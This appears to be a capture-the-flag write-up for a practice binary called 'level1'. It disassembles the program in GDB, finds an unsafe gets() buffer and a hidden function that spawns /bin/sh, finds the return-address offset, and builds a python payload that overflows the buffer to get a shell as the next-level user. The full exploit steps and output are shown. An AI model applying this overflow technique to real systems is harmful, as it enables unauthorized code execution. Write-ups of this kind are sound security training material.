# Level1

First step - testing the program

	$ ./level1
	coucou

The program wait an input and quit after press enter

Start the program in GDB

	$ gdb level1
	(gdb) disas main
	Dump of assembler code for function main:
	   0x08048480 <+0>:		push   ebp
	   0x08048481 <+1>:		mov    ebp,esp
	   0x08048483 <+3>:		and    esp,0xfffffff0
	   0x08048486 <+6>:		sub    esp,0x50 <--------- Buffer of 80
	   0x08048489 <+9>:		lea    eax,[esp+0x10]
	   0x0804848d <+13>:	mov    DWORD PTR [esp],eax
	   0x08048490 <+16>:	call   0x8048340 <gets@plt>
	   0x08048495 <+21>:	leave
	   0x08048496 <+22>:	ret
	End of assembler dump.

Just a `gets()` call and quit

List the functions of the program

	(gdb) info function
	All defined functions:

	Non-debugging symbols:
	0x080482f8  _init
	0x08048340  gets@plt
	0x08048350  fwrite@plt
	0x08048360  system@plt
	0x08048370  __gmon_start__@plt
	0x08048380  __libc_start_main@plt
	0x08048390  _start
	0x080483c0  __do_global_dtors_aux
	0x08048420  frame_dummy
	0x08048444  run <---------- function not called in main
	0x08048480  main
	0x080484a0  __libc_csu_init
	0x08048510  __libc_csu_fini
	0x08048512  __i686.get_pc_thunk.bx
	0x08048520  __do_global_ctors_aux
	0x0804854c  _fini

We can see a function "run", not called in the main

Disassemble this function

	(gdb) disas run
	Dump of assembler code for function run:
	   0x08048444 <+0>:		push   ebp
	   0x08048445 <+1>:		mov    ebp,esp
	   0x08048447 <+3>:		sub    esp,0x18
	   0x0804844a <+6>:		mov    eax,ds:0x80497c0
	   0x0804844f <+11>:	mov    edx,eax
	   0x08048451 <+13>:	mov    eax,0x8048570
	   0x08048456 <+18>:	mov    DWORD PTR [esp+0xc],edx
	   0x0804845a <+22>:	mov    DWORD PTR [esp+0x8],0x13
	   0x08048462 <+30>:	mov    DWORD PTR [esp+0x4],0x1
	   0x0804846a <+38>:	mov    DWORD PTR [esp],eax
	   0x0804846d <+41>:	call   0x8048350 <fwrite@plt>
	   0x08048472 <+46>:	mov    DWORD PTR [esp],0x8048584
	   0x08048479 <+53>:	call   0x8048360 <system@plt> <------- system call
	   0x0804847e <+58>:	leave
	   0x0804847f <+59>:	ret
	End of assembler dump.

There is a `system()` call

Check the argument of system

	(gdb) x/s 0x8048584
	0x8048584:	 "/bin/sh"


We need to force the call to the "run" function

**********************************

Get the EIP offset. First, with the size of the buffer : 80

	$ python -c 'print "B"*80' > /tmp/payload

	$(gdb) r < /tmp/payload
	Starting program: /home/user/level1/level1 < /tmp/payload

	Program received signal SIGSEGV, Segmentation fault.
	0x42424242 in ?? ()

EIP is overwritten, good. Remove 4 bytes to check if EIP start at 76

	$ python -c 'print "B"*76' > /tmp/payload

	$(gdb) r < /tmp/payload
	Starting program: /home/user/level1/level1 < /tmp/payload

	Program received signal SIGILL, Illegal instruction.
	0xb7e45400 in __libc_start_main () from /lib/i386-linux-gnu/libc.so.6

It's good

**********************************

The last 4 bytes of the payload will be the address of the function "run" for calling it instead of EIP

The address of the "run" function is "0x08048444" has seen above

Beware of the little endian

	$ python -c 'print "B"*76+"\x44\x84\x04\x08"' > /tmp/payload

Now execute with our payload and keep stdin open with `cat`

	$ python -c 'print "B"*76+"\x44\x84\x04\x08"' > /tmp/payload
	$ cat /tmp/payload - | ./level1
	Good... Wait what?
	whoami
	level2

Done!

Script it for reproduce!
